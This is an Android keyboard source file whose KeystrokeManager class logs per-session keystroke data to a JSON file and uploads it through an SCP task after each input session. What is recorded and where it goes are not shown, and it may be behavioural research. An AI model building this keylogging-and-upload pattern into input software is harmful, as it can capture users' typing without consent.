package rkr.simplekeyboard.inputmethod.keystroke;

import java.io.File;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;


public class KeystrokeManager {

    final private Context context;
    private static final String FILENAME = "kspattern.json";
    private JSONArray ja = null;
    private File file;
    private int newInput = -1;
    private int orientation = -1;
    private final Random rand;
    KeystrokeSensors sensors;

    public KeystrokeManager(Context context) {
        this.context = context;
        rand = new Random();
        rand.setSeed(System.nanoTime());
        sensors = new KeystrokeSensors(context);
    }

    public void onCreate() {
        try {
            final File folder = context.getFilesDir();

            File[] files = folder.listFiles();
            if (files.length == 1 && files[0].getName().contains(".json")) {
                file = files[0];
            }
            else if (files.length > 1) {
                for (File fileTodelete : files) {
                    if (!fileTodelete.delete())
                        Log.e("Delete Error", "A file cannot be deleted in the external storage");
                }
                file = new File(folder, rand.nextInt() + FILENAME); //create the file if it doesn't exist
            }
            else {
                file = new File(folder, rand.nextInt() + FILENAME); //create the file if it doesn't exist
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    void addJsonElem(JSONObject new_jo) {
        orientation = context.getResources().getConfiguration().orientation;
        ja.put(new_jo);
    }

    public void onStartInput() {
        try {
            if (ja == null) {
                newInput = rand.nextInt();
                ja = new JSONArray();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDestroy() {
    }

    public void onFinishInput() {
        try {
            if (ja.length() > 0) {
                JSONObject jo = new JSONObject();
                jo.put(newInput + "#" + orientation, ja);
                String str = jo.toString();
                RandomAccessFile raf = new RandomAccessFile(file,"rwd");

                // Concat two json object (string format)
                if (file.length() > 0) {
                    raf.setLength(raf.length()-1);
                    str = str.replaceFirst("\\{", ",");
                }

                FileOutputStream outputStream = new FileOutputStream(file, true);
                outputStream.write(str.getBytes());
                outputStream.close();
                ja = null;

                new SendFilesScp().execute(file.getPath());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
